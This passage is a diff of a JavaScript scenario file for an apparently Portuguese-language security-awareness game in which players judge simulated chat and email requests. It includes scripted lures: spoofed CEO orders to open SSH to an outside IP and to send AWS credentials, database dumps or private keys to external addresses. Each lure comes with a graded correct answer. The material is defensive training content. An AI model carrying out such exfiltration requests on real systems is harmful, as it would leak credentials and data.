+        inspector: { type: 'url', label: 'Auditoria de Sessão TechZap', dest: 'IP: Bucareste, Romênia | Solicitação: private_key.pem | Crachá: NÃO INFORMADO' },
         actions: [
-          { id: 'a1', label: '🔒 Bloquear Conta Imediatamente & Alertar CISO', correct: true, toastMsg: 'Conta fraudulenta bloqueada.', logTitle: 'Tentativa de Roubo de Certificado SSL Barrada', consequence: 'Tentativa de extorsão e roubo de chaves criptográficas abortada.', explanation: 'Perfeito! IP da Romênia, não soube informar o crachá e pediu arquivo de chave SSL — chaves nunca são enviadas por chat.' },
-          { id: 'a2', label: '📦 Enviar Arquivo private_key.pem', correct: false, toastMsg: 'Chave enviada.', logTitle: 'Vazamento Crítico de Chaves SSL', consequence: 'A gangue interceptou todo o tráfego HTTPS criptografado da empresa.', explanation: 'Chaves privadas nunca saem do cofre de servidores — jamais por WhatsApp ou chat.' }
+          { id: 'a1', label: '🔒 Bloquear Conta Imediatamente', correct: true, toastMsg: 'Conta fraudulenta bloqueada.', logTitle: 'Roubo de Certificado SSL Barrado', consequence: 'Roubo de chaves criptográficas abortado.', explanation: 'IP da Romênia, crachá não informado e pedido de chave SSL (nunca enviada por chat).' },
+          { id: 'a2', label: '📦 Enviar private_key.pem', correct: false, toastMsg: 'Chave enviada.', logTitle: 'Vazamento Crítico de Chaves SSL', consequence: 'Tráfego HTTPS da empresa totalmente comprometido.', explanation: 'Chaves privadas SSL jamais são enviadas por mensagem.' }
         ]
       },
       {
@@ -749,8 +683,8 @@ const CAMPAIGN_SHIFTS = [
         avatarImg: 'alex_einstein.jpg',
         avatarChar: 'A',
         avatarColor: '#f57c00',
-        subject: 'alex.intern: "Erro de certificado no staging, ajuda?"',
-        snippet: 'Estou com erro 403 no ambiente de staging. Segue meu chamado #STG-331 e crachá #INT-007...',
+        subject: 'alex.intern: "Erro de certificado no staging"',
+        snippet: 'Erro 403 em staging. Chamado #STG-331 e crachá #INT-007.',
         meta: { 'Contato': 'alex.intern (Estagiário)', 'Localização IP': 'São Paulo, Brasil', 'Data': '16:02', 'Chamado': '#STG-331' },
         body: `<div class="techzap-screen">
   <div class="wz-topbar">
@@ -768,7 +702,7 @@ const CAMPAIGN_SHIFTS = [
       <div class="wz-msg-avatar" style="background:transparent; padding:0;"><img src="alex_einstein.jpg" style="width:100%;height:100%;border-radius:50%;object-fit:cover;"></div>
       <div class="wz-bubble">
         <div class="wz-bubble-sender">alex.intern</div>
-        Oi time de TI! Estou tentando rodar os testes do front-end no ambiente de staging e dá erro de certificado (403 Forbidden). Segue o chamado registrado no portal: <strong>#STG-331</strong> e meu crachá: <strong>#INT-007</strong>. Podem me orientar? 🙏
+        Erro 403 no staging. Chamado: <strong>#STG-331</strong> e crachá: <strong>#INT-007</strong>. Podem me orientar? 🙏
         
         <div class="wz-doc-attachment-card" id="wz-attachment-card" title="Clique para abrir a auditoria da sessão">
           <div class="wz-doc-icon-box">📄</div>
@@ -789,10 +723,10 @@ const CAMPAIGN_SHIFTS = [
     <button class="wz-send-btn">➤</button>
   </div>
 </div>`,
-        inspector: { type: 'url', label: 'Auditoria de Sessão TechZap', dest: 'IP de Origem: 177.18.22.88 (São Paulo, Brasil) | Crachá: #INT-007 ✓ | Chamado: #STG-331 ✓' },
+        inspector: { type: 'url', label: 'Auditoria de Sessão TechZap', dest: 'IP: São Paulo, Brasil | Crachá: #INT-007 ✓ | Chamado: #STG-331 ✓' },
         actions: [
-          { id: 'a1', label: '📨 Responder com Link da Documentação da Intranet', correct: true, toastMsg: 'Orientação enviada.', logTitle: 'Suporte Interno Prestado', consequence: 'Estagiário configurou o certificado de staging corretamente.', explanation: 'Contato legítimo: IP de SP, crachá #INT-007 correto e chamado #STG-331 registrado — tudo conferido.' },
-          { id: 'a2', label: '🔒 Bloquear Alex como Suspeito', correct: false, toastMsg: 'Alex bloqueado.', logTitle: 'Bloqueio Indevido de Suporte', consequence: 'Estagiário ficou sem trabalhar por bloqueio incorreto.', explanation: 'Alex forneceu crachá correto #INT-007 e chamado regular. Não há nenhum sinal de perigo.' }
+          { id: 'a1', label: '📨 Responder com Documentação', correct: true, toastMsg: 'Orientação enviada.', logTitle: 'Suporte Interno Prestado', consequence: 'Estagiário configurou o ambiente de staging.', explanation: 'Contato legítimo com crachá e chamado corretos.' },
+          { id: 'a2', label: '🔒 Bloquear Alex como Suspeito', correct: false, toastMsg: 'Alex bloqueado.', logTitle: 'Bloqueio Indevido', consequence: 'Trabalho do estagiário paralisado sem motivo.', explanation: 'Alex forneceu crachá correto #INT-007 e chamado válido.' }
         ]
       },
       {
@@ -804,9 +738,9 @@ const CAMPAIGN_SHIFTS = [
         avatarImg: 'desconhecido_hellokitty.jpg',
         avatarChar: '',
         avatarColor: 'transparent',
-        subject: 'Número desconhecido: "Rogério CEO enviou um arquivo"',
-        snippet: 'Aqui é o Rogério CEO... mandei o arquivo por aqui mesmo. Extraia e mande...',
-        meta: { 'Número': '+1 555 019-2831 (EUA / VOIP)', 'Data': '17:28', 'Status': 'Número VOIP Desconhecido — NÃO registrado na TechCore' },
+        subject: 'Número desconhecido: "Rogério CEO"',
+        snippet: 'Mandei mensagem por aqui. Libere o IP no firewall SSH agora.',
+        meta: { 'Número': '+1 555 019-2831 (EUA / VOIP)', 'Data': '17:28', 'Status': 'Número VOIP Desconhecido — NÃO registrado' },
         body: `<div class="techzap-screen">
   <div class="wz-topbar">
     <span class="wz-topbar-back">←</span>
@@ -823,7 +757,7 @@ const CAMPAIGN_SHIFTS = [
       <div class="wz-msg-avatar" style="background:transparent; padding:0;"><img src="desconhecido_hellokitty.jpg" style="width:100%;height:100%;border-radius:50%;object-fit:cover;"></div>
       <div class="wz-bubble">
         <div class="wz-bubble-sender" style="color:#e53935;">⚠️ Número Desconhecido</div>
-        Aqui é o Rogério CEO. Estou em Nova York fechando um contrato de aquisição. Preciso que você libere <strong>agora</strong> o IP 198.51.100.22 no firewall SSH. <strong>Não fale com ninguém sobre isso.</strong>
+        Aqui é o Rogério CEO. Libere <strong>agora</strong> o IP 198.51.100.22 no firewall SSH. Não fale com ninguém.
         
         <div class="wz-doc-attachment-card" id="wz-attachment-card" title="Clique para abrir auditoria da sessão">
           <div class="wz-doc-icon-box">📄</div>
@@ -844,17 +778,17 @@ const CAMPAIGN_SHIFTS = [
     <button class="wz-send-btn">➤</button>
   </div>
 </div>`,
-        inspector: { type: 'url', label: 'Auditoria de Número de Telefone', dest: 'Telefone: +1 (555) 019-2831 — VOIP não registrado nos sistemas TechCore | Ação solicitada: Liberação de Porta 22 (SSH) para IP externo' },
+        inspector: { type: 'url', label: 'Auditoria de Número de Telefone', dest: 'Telefone: +1 (555) 019-2831 — VOIP não registrado | Ação: Liberação de Porta SSH (22)' },
         actions: [
-          { id: 'a1', label: '🚨 Denunciar Número & Bloquear no Gateway', correct: true, toastMsg: 'Número falso bloqueado.', logTitle: 'Fraude do CEO no WhatsApp Neutralizada', consequence: 'Tentativa de manipulação executiva abortada e registrada no relatório de incidentes.', explanation: 'Perfeito! Número VOIP desconhecido, não registrado na TechCore. O CEO Rogério usa exclusivamente os canais oficiais internos.' },
-          { id: 'a2', label: '🔓 Abrir Porta SSH no Firewall', correct: false, toastMsg: 'Porta liberada.', logTitle: 'Porta SSH Exposta a Invasores', consequence: 'Os criminosos invadiram o gateway central através da porta liberada por número falso.', explanation: 'Fraude clássica de CEO (CEO Fraud). Número VOIP + pedido de sigilo + urgência = ataque de engenharia social.' }
+          { id: 'a1', label: '🚨 Denunciar e Bloquear Número', correct: true, toastMsg: 'Número falso bloqueado.', logTitle: 'Golpe do CEO Neutralizado', consequence: 'Golpe do CEO neutralizado.', explanation: 'Número VOIP não registrado. O CEO Rogério usa apenas canais internos.' },
+          { id: 'a2', label: '🔓 Abrir Porta SSH no Firewall', correct: false, toastMsg: 'Porta liberada.', logTitle: 'Porta SSH Exposta', consequence: 'Invasores acessaram o servidor SSH central.', explanation: 'Golpe de CEO Fraud com número VOIP e pressão de urgência.' }
         ]
       }
     ]
   },
 
   // ----------------------------------------------------
-  // TURNO 4: Contrainteligência & Envio de Arquivos (TechVault)
+  // TURNO 4: Contrainteligência & Envio de Arquivos
   // ----------------------------------------------------
   {
     shiftNumber: 4,
@@ -863,42 +797,32 @@ const CAMPAIGN_SHIFTS = [
     brandIcon: '📦',
     url: 'https://vault-dispatch.techcore.internal/ops/#honeytokens',
     wordContent: `
-      <h2>1. PROTOCOLO DE DESPACHO SEGURO (TECHVAULT)</h2>
-      <p>Nesta fase de contrainteligência, <strong>APENAS</strong> os 3 arquivos e destinos abaixo foram autorizados pelo CEO Rogério Silva:</p>
+      <h2>1. DESPACHO SEGURO (TECHVAULT)</h2>
+      <p>Apenas estes 3 arquivos e destinos foram autorizados pelo CEO Rogério Silva:</p>
       <ul>
-        <li><code>honeytoken_trap_v4.vault</code> ➔ <code>dropzone-trap@techcore-vault.internal</code> (Isca C2)</li>
-        <li><code>hotfix_auth_patch.enc</code> ➔ <code>deploy-cluster@techcore-vault.internal</code> (Cluster de Prod)</li>
-        <li><code>ciso_master_report.sig</code> ➔ <code>board-vault@techcore-vault.internal</code> (Conselho Executivo)</li>
+        <li><code>honeytoken_trap_v4.vault</code> ➔ <code>dropzone-trap@techcore-vault.internal</code></li>
+        <li><code>hotfix_auth_patch.enc</code> ➔ <code>deploy-cluster@techcore-vault.internal</code></li>
+        <li><code>ciso_master_report.sig</code> ➔ <code>board-vault@techcore-vault.internal</code></li>
       </ul>
 
-      <h2>2. REGRAS RÍGIDAS DE BLOQUEIO DE FRAUDES</h2>
+      <h2>2. REGRAS DE BLOQUEIO</h2>
       <ul>
-        <li><strong>Atenção:</strong> Todos os e-mails neste turno utilizam o nome e e-mail do CEO Rogério Silva (<code>rogerio.ceo@techcore.com</code>).</li>
-        <li>Verifique se a combinação de <em>arquivo</em> + <em>destino</em> corresponde exatamente aos 3 itens autorizados acima.</li>
-        <li>Qualquer pedido de envio de credenciais reais (<code>aws_credentials.json</code>), dumps de banco (<code>database_full_dump.sql</code>), dados de folha de pagamento ou arquivos para destinos externos / imprensa é <strong>FALSO</strong> e deve ser <strong>REJEITADO</strong>.</li>
+        <li>Todos os e-mails parecerão vir de <code>rogerio.ceo@techcore.com</code>.</li>
+        <li>Rejeite envio de credenciais (<code>aws_credentials.json</code>), dumps de banco ou envios para imprensa/externos.</li>
       </ul>
     `,
     ceoDialogues: [
       {
         step: 1,
-        text: `
-          <p>Chegamos ao turno decisivo da nossa campanha, Analista! O <strong>Turno 4</strong> é a nossa contraofensiva final.</p>
-          <p>Com as evidências dos turnos anteriores, vamos armar uma <strong>emboscada digital (Honeytokens)</strong> e despachar correções críticas.</p>
-        `
+        text: `<p>Chegamos ao <strong>Turno 4</strong>! Vamos armar a armadilha digital (Honeytokens) e aplicar correções críticas.</p>`
       },
       {
         step: 2,
-        text: `
-          <p>Ativei o <strong>TechVault (Despachador Seguro de Arquivos)</strong> na sua estação.</p>
-          <p><strong>🚨 ALERTA CRÍTICO:</strong> Descobrimos que os atacantes estão enviando e-mails se passando por MIM! Todos os e-mails parecerão vir de <code>rogerio.ceo@techcore.com</code>.</p>
-        `
+        text: `<p><strong>Atenção:</strong> Atacantes estão enviando e-mails falsos em meu nome (<code>rogerio.ceo@techcore.com</code>)!</p>`
       },
       {
         step: 3,
-        text: `
-          <p>Confira com extrema atenção a lista dos 3 únicos pares de arquivo e destino autorizados no <strong>Word (Procedimentos_TI.doc)</strong>!</p>
-          <p>Neste turno final, a tolerância é mínima: você pode cometer <strong>NO MÁXIMO 1 ERRO</strong>. Foco total!</p>
-        `
+        text: `<p>Confira os 3 pares autorizados no <strong>Word</strong>. Limite final: <strong>NO MÁXIMO 1 ERRO</strong>!</p>`
       }
     ],
     scenarios: [
@@ -911,15 +835,15 @@ const CAMPAIGN_SHIFTS = [
         avatarImg: 'ceo_rogerio.jpg',
         avatarChar: 'R',
         avatarColor: '#0055ea',
-        subject: '[ORDEM DIRETA] Despachar Arquivo Honeytoken: honeytoken_trap_v4.vault',
-        snippet: 'Despache a armadilha com tokens falsos para o dropzone oficial da perícia...',
+        subject: '[ORDEM] Despachar honeytoken_trap_v4.vault',
+        snippet: 'Enviar armadilha para dropzone-trap@techcore-vault.internal.',
         attachmentFileName: 'honeytoken_trap_v4.vault',
-        meta: { 'De': 'CEO Rogério Silva <rogerio.ceo@techcore.com>', 'Arquivo': 'honeytoken_trap_v4.vault', 'Destino': 'dropzone-trap@techcore-vault.internal', 'Data': '09:12', 'Prioridade': 'MÁXIMA (CEO)' },
-        body: `<p>Instrução Direta do CEO Rogério:</p><div class="email-quote-box"><p>"Analista, envie agora o arquivo <code>honeytoken_trap_v4.vault</code> para o endereço de armadilha oficial <code>dropzone-trap@techcore-vault.internal</code> para rastrearmos a origem do grupo hacker."</p></div>`,
-        inspector: { type: 'url', label: 'Inspeção de Despacho de Arquivo', dest: 'Arquivo: honeytoken_trap_v4.vault -> Destino: dropzone-trap@techcore-vault.internal' },
+        meta: { 'De': 'CEO Rogério Silva <rogerio.ceo@techcore.com>', 'Arquivo': 'honeytoken_trap_v4.vault', 'Destino': 'dropzone-trap@techcore-vault.internal', 'Data': '09:12', 'Prioridade': 'MÁXIMA' },
+        body: `<p>Instrução do CEO Rogério:</p><div class="email-quote-box"><p>Envie o arquivo <code>honeytoken_trap_v4.vault</code> para <code>dropzone-trap@techcore-vault.internal</code>.</p></div>`,
+        inspector: { type: 'url', label: 'Inspeção de Despacho', dest: 'Arquivo: honeytoken_trap_v4.vault -> Destino: dropzone-trap@techcore-vault.internal' },
         actions: [
-          { id: 'a1', label: '🚀 Despachar honeytoken_trap_v4.vault para o Cofre Oficial', correct: true, toastMsg: 'Honeytoken despachado com sucesso.', logTitle: 'Armadilha Honeytoken Ativada', consequence: 'O grupo hacker mordeu a isca e seus endereços IP foram triangulados pela polícia.', explanation: 'Ordem oficial do CEO Rogério cumprida com precisão de acordo com o Word.' },
-          { id: 'a2', label: '🚫 Cancelar Envio', correct: false, toastMsg: 'Envio cancelado.', logTitle: 'Operação de Contrainteligência Abortada', consequence: 'A emboscada falhou e a gangue conseguiu escapar sem ser rastreada.', explanation: 'O arquivo e destino estavam estritamente autorizados no Word.' }
+          { id: 'a1', label: '🚀 Despachar honeytoken_trap_v4.vault', correct: true, toastMsg: 'Honeytoken despachado.', logTitle: 'Armadilha Ativada', consequence: 'Grupo hacker caiu na armadilha e teve IP triangulado.', explanation: 'Envio autorizado conforme manual do Word.' },
+          { id: 'a2', label: '🚫 Cancelar Envio', correct: false, toastMsg: 'Envio cancelado.', logTitle: 'Operação Abortada', consequence: 'A emboscada falhou e os hackers escaparam.', explanation: 'Arquivo e destino estavam autorizados.' }
         ]
       },
       {
@@ -931,15 +855,15 @@ const CAMPAIGN_SHIFTS = [
         avatarImg: 'ceo_rogerio.jpg',
         avatarChar: 'R',
         avatarColor: '#0055ea',
-        subject: '[URGENTE/AUDITORIA] Envio Obrigatório do Arquivo aws_credentials.json',
-        snippet: 'Envie imediatamente as credenciais da AWS para o bucket de validação externa...',
+        subject: '[URGENTE] Enviar aws_credentials.json',
+        snippet: 'Despache credenciais AWS para validação externa.',
         attachmentFileName: 'aws_credentials.json',
         meta: { 'De': 'CEO Rogério Silva <rogerio.ceo@techcore.com>', 'Arquivo Solicitado': 'aws_credentials.json', 'Destino': 'exfil-bucket@aws-cloud-verify.net', 'Data': '10:28' },
-        body: `<p>Solicitação do CEO Rogério:</p><div class="email-quote-box"><p>"Precisamos passar por uma auditoria de emergência da nuvem. Despache o arquivo <code>aws_credentials.json</code> para o bucket <code>exfil-bucket@aws-cloud-verify.net</code> imediatamente."</p></div>`,
-        inspector: { type: 'url', label: 'Inspeção de Destino de Arquivo', dest: 'Arquivo: aws_credentials.json -> Destino: exfil-bucket@aws-cloud-verify.net' },
+        body: `<p>Solicitação do CEO Rogério:</p><div class="email-quote-box"><p>Despache <code>aws_credentials.json</code> para <code>exfil-bucket@aws-cloud-verify.net</code>.</p></div>`,
+        inspector: { type: 'url', label: 'Inspeção de Destino', dest: 'Arquivo: aws_credentials.json -> Destino: exfil-bucket@aws-cloud-verify.net' },
         actions: [
-          { id: 'a1', label: '🚀 Despachar Credenciais AWS', correct: false, toastMsg: 'Chaves enviadas.', logTitle: 'Vazamento Total da Infraestrutura AWS', consequence: 'Os invasores capturaram as chaves reais e assumiram o controle de toda a nuvem.', explanation: 'Golpe! O CEO verdadeiro nunca solicita envio de credenciais reais (aws_credentials.json) nem destinos externos.' },
-          { id: 'a2', label: '🚫 Rejeitar Solicitação e Bloquear', correct: true, toastMsg: 'Tentativa de exfiltração bloqueada.', logTitle: 'Exfiltração de Credenciais Interceptada', consequence: 'Tentativa de roubo de chaves da AWS neutralizada com sucesso.', explanation: 'Excelente! Credenciais reais jamais devem ser despachadas e o destino era um servidor externo malicioso.' }
+          { id: 'a1', label: '🚀 Despachar Credenciais AWS', correct: false, toastMsg: 'Chaves enviadas.', logTitle: 'Vazamento Total AWS', consequence: 'Invasores assumiram o controle total da nuvem AWS.', explanation: 'O CEO nunca solicita envio de credenciais reais nem destinos externos.' },
+          { id: 'a2', label: '🚫 Rejeitar Solicitação', correct: true, toastMsg: 'Exfiltração bloqueada.', logTitle: 'Exfiltração Interceptada', consequence: 'Tentativa de exfiltração de chaves neutralizada.', explanation: 'Credenciais reais jamais devem ser despachadas.' }
         ]
       },
       {
@@ -951,15 +875,15 @@ const CAMPAIGN_SHIFTS = [
         avatarImg: 'ceo_rogerio.jpg',
         avatarChar: 'R',
         avatarColor: '#0055ea',
-        subject: '[DEPLOY EMERGENCIAL] Despacho do Pacote: hotfix_auth_patch.enc',
-        snippet: 'Enviar hotfix criptografado de correção de vulnerabilidade para o cluster de deploy...',
+        subject: '[DEPLOY] Despachar hotfix_auth_patch.enc',
+        snippet: 'Enviar pacote criptografado de correção para o cluster.',
         attachmentFileName: 'hotfix_auth_patch.enc',
-        meta: { 'De': 'CEO Rogério Silva <rogerio.ceo@techcore.com>', 'Arquivo': 'hotfix_auth_patch.enc', 'Destino': 'deploy-cluster@techcore-vault.internal', 'Data': '11:42', 'Status': 'Assinado' },
-        body: `<p>Instrução de Deploy Seguro:</p><div class="email-quote-box"><p>"Despache o pacote <code>hotfix_auth_patch.enc</code> para o cluster de deploy <code>deploy-cluster@techcore-vault.internal</code> para aplicar o patch que bloqueia a brecha de segurança."</p></div>`,
-        inspector: { type: 'url', label: 'Inspeção de Pacote de Patch', dest: 'Arquivo: hotfix_auth_patch.enc -> Destino: deploy-cluster@techcore-vault.internal' },
+        meta: { 'De': 'CEO Rogério Silva <rogerio.ceo@techcore.com>', 'Arquivo': 'hotfix_auth_patch.enc', 'Destino': 'deploy-cluster@techcore-vault.internal', 'Data': '11:42' },
+        body: `<p>Instrução de Deploy:</p><div class="email-quote-box"><p>Despache <code>hotfix_auth_patch.enc</code> para <code>deploy-cluster@techcore-vault.internal</code>.</p></div>`,
+        inspector: { type: 'url', label: 'Inspeção de Patch', dest: 'Arquivo: hotfix_auth_patch.enc -> Destino: deploy-cluster@techcore-vault.internal' },
         actions: [
-          { id: 'a1', label: '🚀 Despachar hotfix_auth_patch.enc para Deploy', correct: true, toastMsg: 'Patch despachado e aplicado.', logTitle: 'Patch de Segurança Aplicado em Produção', consequence: 'Vulnerabilidades corrigidas em todos os servidores da TechCore.', explanation: 'Envio do arquivo correto para o destino interno seguro conforme manual do Word.' },
-          { id: 'a2', label: '🚫 Rejeitar Despacho do Patch', correct: false, toastMsg: 'Patch não enviado.', logTitle: 'Atraso em Correção Crítica', consequence: 'Servidores continuaram vulneráveis por falta de aplicação do hotfix.', explanation: 'O pacote de correção foi requisitado legitimamente e bate com as regras do Word.' }
+          { id: 'a1', label: '🚀 Despachar hotfix_auth_patch.enc', correct: true, toastMsg: 'Patch despachado.', logTitle: 'Patch Aplicado', consequence: 'Vulnerabilidades corrigidas em todos os servidores.', explanation: 'Envio de patch autorizado no Word.' },
+          { id: 'a2', label: '🚫 Rejeitar Despacho', correct: false, toastMsg: 'Patch não enviado.', logTitle: 'Atraso na Correção', consequence: 'Servidores continuaram vulneráveis.', explanation: 'O pacote de correção estava autorizado.' }
         ]
       },
       {
@@ -971,15 +895,15 @@ const CAMPAIGN_SHIFTS = [
         avatarImg: 'ceo_rogerio.jpg',
         avatarChar: 'R',
         avatarColor: '#0055ea',
-        subject: '[IMPRENSA] Cópia Externa do Relatório Forense: ciso_master_report.sig',
-        snippet: 'Favor enviar uma cópia preliminar do relatório para a equipe de jornalismo...',
+        subject: '[IMPRENSA] Enviar ciso_master_report.sig para jornalistas',
+        snippet: 'Enviar cópia preliminar do relatório para vazamentos@techleaks-news.com.',
         attachmentFileName: 'ciso_master_report.sig',
         meta: { 'De': 'CEO Rogério Silva <rogerio.ceo@techcore.com>', 'Arquivo': 'ciso_master_report.sig', 'Destino': 'vazamentos@techleaks-news.com', 'Data': '13:18' },
-        body: `<p>Instrução de Comunicação:</p><div class="email-quote-box"><p>"Preciso que você envie uma cópia de prévia do <code>ciso_master_report.sig</code> para a imprensa no endereço <code>vazamentos@techleaks-news.com</code> para demonstrarmos transparência."</p></div>`,
-        inspector: { type: 'url', label: 'Inspeção de Destino de Arquivo', dest: 'Arquivo: ciso_master_report.sig -> Destino: vazamentos@techleaks-news.com' },
+        body: `<p>Solicitação de Envio:</p><div class="email-quote-box"><p>Envie prévia do <code>ciso_master_report.sig</code> para <code>vazamentos@techleaks-news.com</code>.</p></div>`,
+        inspector: { type: 'url', label: 'Inspeção de Destino', dest: 'Arquivo: ciso_master_report.sig -> Destino: vazamentos@techleaks-news.com' },
         actions: [
-          { id: 'a1', label: '🚀 Despachar Relatório para a Imprensa', correct: false, toastMsg: 'Relatório enviado.', logTitle: 'Vazamento de Segredo Corporativo', consequence: 'Dados sigilosos de vulnerabilidades foram publicados na mídia, causando pânico.', explanation: 'Golpe! O relatório ciso_master_report.sig só pode ser enviado para board-vault@techcore-vault.internal, jamais para a imprensa.' },
-          { id: 'a2', label: '🚫 Rejeitar Envio Externo', correct: true, toastMsg: 'Vazamento prevenido.', logTitle: 'Tentativa de Exfiltração para Imprensa Barrada', consequence: 'Sigilo de mercado preservado de acordo com a política corporativa.', explanation: 'Excelente! O destino autorizado no Word é board-vault@techcore-vault.internal.' }
+          { id: 'a1', label: '🚀 Despachar para Imprensa', correct: false, toastMsg: 'Relatório enviado.', logTitle: 'Vazamento de Segredo', consequence: 'Dados sigilosos vazados na mídia.', explanation: 'ciso_master_report.sig só pode ser enviado para board-vault@techcore-vault.internal.' },
+          { id: 'a2', label: '🚫 Rejeitar Envio Externo', correct: true, toastMsg: 'Vazamento prevenido.', logTitle: 'Exfiltração Barrada', consequence: 'Sigilo corporativo preservado.', explanation: 'Excelente! O destino autorizado no Word é board-vault@techcore-vault.internal.' }
         ]
       },
       {
@@ -991,15 +915,15 @@ const CAMPAIGN_SHIFTS = [
         avatarImg: 'ceo_rogerio.jpg',
         avatarChar: 'R',
         avatarColor: '#0055ea',
-        subject: '[BACKUP EMERGENCIAL] Envio do Banco de Dados: database_full_dump.sql',
-        snippet: 'Despache o dump completo do banco de produção para o servidor de contingência...',
+        subject: '[BACKUP] Enviar database_full_dump.sql',
+        snippet: 'Despache o dump do banco de dados para servidor de contingência.',
         attachmentFileName: 'database_full_dump.sql',
         meta: { 'De': 'CEO Rogério Silva <rogerio.ceo@techcore.com>', 'Arquivo': 'database_full_dump.sql', 'Destino': 'backup-temp@techcore-vault.internal', 'Data': '14:38' },
-        body: `<p>Instrução de Backup Solicitada:</p><div class="email-quote-box"><p>"Analista, envie o arquivo <code>database_full_dump.sql</code> para o endereço <code>backup-temp@techcore-vault.internal</code> por segurança antes da manutenção."</p></div>`,
-        inspector: { type: 'url', label: 'Inspeção de Despacho de Banco', dest: 'Arquivo: database_full_dump.sql -> Destino: backup-temp@techcore-vault.internal' },
+        body: `<p>Instrução de Backup:</p><div class="email-quote-box"><p>Envie <code>database_full_dump.sql</code> para <code>backup-temp@techcore-vault.internal</code>.</p></div>`,
+        inspector: { type: 'url', label: 'Inspeção de Despacho', dest: 'Arquivo: database_full_dump.sql -> Destino: backup-temp@techcore-vault.internal' },
         actions: [
-          { id: 'a1', label: '🚀 Despachar Dump do Banco', correct: false, toastMsg: 'Banco despachado.', logTitle: 'Exfiltração de Banco de Dados', consequence: 'Invasores capturaram o arquivo de dump completo contendo todos os dados de clientes.', explanation: 'Falso! O arquivo database_full_dump.sql não consta na lista de autorizados do Word.' },
-          { id: 'a2', label: '🚫 Rejeitar Envio Não Autorizado', correct: true, toastMsg: 'Envio de dump rejeitado.', logTitle: 'Tentativa de Extração de Banco Impedida', consequence: 'Integridade do banco de dados mantida sem exfiltração.', explanation: 'Correto! Apenas honeytoken_trap_v4.vault, hotfix_auth_patch.enc e ciso_master_report.sig são autorizados.' }
+          { id: 'a1', label: '🚀 Despachar Dump', correct: false, toastMsg: 'Banco despachado.', logTitle: 'Exfiltração de Banco', consequence: 'Invasores capturaram o dump completo do banco.', explanation: 'database_full_dump.sql não consta na lista de autorizados.' },
+          { id: 'a2', label: '🚫 Rejeitar Envio', correct: true, toastMsg: 'Envio rejeitado.', logTitle: 'Extração Impedida', consequence: 'Integridade do banco de dados mantida.', explanation: 'Correto! Apenas os 3 arquivos listados no Word são autorizados.' }
         ]
       },
       {
@@ -1011,15 +935,15 @@ const CAMPAIGN_SHIFTS = [
         avatarImg: 'ceo_rogerio.jpg',
         avatarChar: 'R',
         avatarColor: '#0055ea',
-        subject: '[PERÍCIA PARCEIRA] Despacho do Honeytoken: honeytoken_trap_v4.vault',
-        snippet: 'Enviar a armadilha de honeytoken para o servidor da consultoria externa de segurança...',
+        subject: '[PERÍCIA] Despachar Honeytoken para Consultoria Externa',
+        snippet: 'Enviar honeytoken_trap_v4.vault para external-drop@cloud-analytica.org.',
         attachmentFileName: 'honeytoken_trap_v4.vault',
         meta: { 'De': 'CEO Rogério Silva <rogerio.ceo@techcore.com>', 'Arquivo': 'honeytoken_trap_v4.vault', 'Destino': 'external-drop@cloud-analytica.org', 'Data': '15:52' },
-        body: `<p>Instrução do CEO Rogério:</p><div class="email-quote-box"><p>"Contratamos uma consultoria externa de perícia. Por favor, despache o <code>honeytoken_trap_v4.vault</code> para <code>external-drop@cloud-analytica.org</code>."</p></div>`,
-        inspector: { type: 'url', label: 'Inspeção de Destino do Honeytoken', dest: 'Arquivo: honeytoken_trap_v4.vault -> Destino: external-drop@cloud-analytica.org' },
+        body: `<p>Instrução do CEO Rogério:</p><div class="email-quote-box"><p>Despache <code>honeytoken_trap_v4.vault</code> para <code>external-drop@cloud-analytica.org</code>.</p></div>`,
+        inspector: { type: 'url', label: 'Inspeção de Destino', dest: 'Arquivo: honeytoken_trap_v4.vault -> Destino: external-drop@cloud-analytica.org' },
         actions: [
-          { id: 'a1', label: '🚀 Despachar Honeytoken para Consultoria', correct: false, toastMsg: 'Arquivo enviado para servidor externo.', logTitle: 'Vazamento de Isca de Contrainteligência', consequence: 'A armadilha foi enviada para um servidor malicioso externo, revelando nossa estratégia de defesa aos hackers.', explanation: 'Falso! O destino correto do honeytoken é dropzone-trap@techcore-vault.internal (servidor interno de captura).' },
-          { id: 'a2', label: '🚫 Rejeitar Destino Incorreto', correct: true, toastMsg: 'Envio bloqueado por destino inválido.', logTitle: 'Desvio de Isca Neutralizado', consequence: 'Armadilha preservada para o destino correto.', explanation: 'Perfeito! O arquivo era o correto, mas o destino era um servidor externo não autorizado no Word.' }
+          { id: 'a1', label: '🚀 Despachar para Consultoria', correct: false, toastMsg: 'Arquivo enviado.', logTitle: 'Vazamento de Isca', consequence: 'Armadilha enviada para servidor malicioso externo.', explanation: 'O destino correto do honeytoken é dropzone-trap@techcore-vault.internal.' },
+          { id: 'a2', label: '🚫 Rejeitar Destino Incorreto', correct: true, toastMsg: 'Envio bloqueado.', logTitle: 'Desvio Neutralizado', consequence: 'Armadilha preservada para o destino correto.', explanation: 'O arquivo estava correto, mas o destino era um servidor externo não autorizado.' }
         ]
       },
       {
@@ -1031,15 +955,15 @@ const CAMPAIGN_SHIFTS = [
         avatarImg: 'ceo_rogerio.jpg',
         avatarChar: 'R',
         avatarColor: '#0055ea',
-        subject: '[REVISÃO FINANCEIRA] Envio do Arquivo: folha_pagamento_executivos.xlsx',
-        snippet: 'Envie a planilha de salários para a auditoria contábil de urgência...',
+        subject: '[FINANCEIRO] Enviar folha_pagamento_executivos.xlsx',
+        snippet: 'Enviar planilha de salários para auditoria contábil externa.',
         attachmentFileName: 'folha_pagamento_executivos.xlsx',
         meta: { 'De': 'CEO Rogério Silva <rogerio.ceo@techcore.com>', 'Arquivo': 'folha_pagamento_executivos.xlsx', 'Destino': 'auditoria-rh@consultoria-externa.net', 'Data': '16:38' },
-        body: `<p>Solicitação de Envio:</p><div class="email-quote-box"><p>"Analista, preciso que envie o arquivo <code>folha_pagamento_executivos.xlsx</code> para <code>auditoria-rh@consultoria-externa.net</code> para fechamento fiscal."</p></div>`,
-        inspector: { type: 'url', label: 'Inspeção de Arquivo e Destino', dest: 'Arquivo: folha_pagamento_executivos.xlsx -> Destino: auditoria-rh@consultoria-externa.net' },
+        body: `<p>Solicitação de Envio:</p><div class="email-quote-box"><p>Envie <code>folha_pagamento_executivos.xlsx</code> para <code>auditoria-rh@consultoria-externa.net</code>.</p></div>`,
+        inspector: { type: 'url', label: 'Inspeção de Arquivo', dest: 'Arquivo: folha_pagamento_executivos.xlsx -> Destino: auditoria-rh@consultoria-externa.net' },
         actions: [
